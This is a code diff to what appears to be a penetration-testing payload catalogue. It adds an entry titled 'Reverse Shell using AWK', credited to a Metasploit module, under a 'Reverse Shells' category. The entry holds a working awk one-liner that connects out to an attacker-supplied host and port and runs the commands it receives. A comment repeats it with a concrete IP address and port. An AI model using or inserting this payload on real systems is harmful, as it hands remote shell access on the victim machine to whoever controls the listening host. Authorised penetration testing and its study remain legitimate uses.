@@ -84,7 +84,19 @@ Load({
 	}
 })
 
+// Credit => Metasploit https://github.com/rapid7/metasploit-framework/blob/b908f41b0fd0eaef9b79d07d078b224d1168df52/modules/payloads/singles/cmd/unix/reverse_awk.rb
+Load({
+	title: "Reverse Shell using AWK",
+	payload: 'awk \'BEGIN{s="/inet/tcp/0/<LHOST>/<LPORT>";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}\'',
+	category: "Reverse Shells",
+	callback: function(bro){
+		question(ask.ncat);
+		ask.some(questions, bro);
+	}
+})
 
+
+// awk 'BEGIN{s="/inet/tcp/0/10.94.172.87/9999";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'
 
 // ############### File Transfers ######################
 
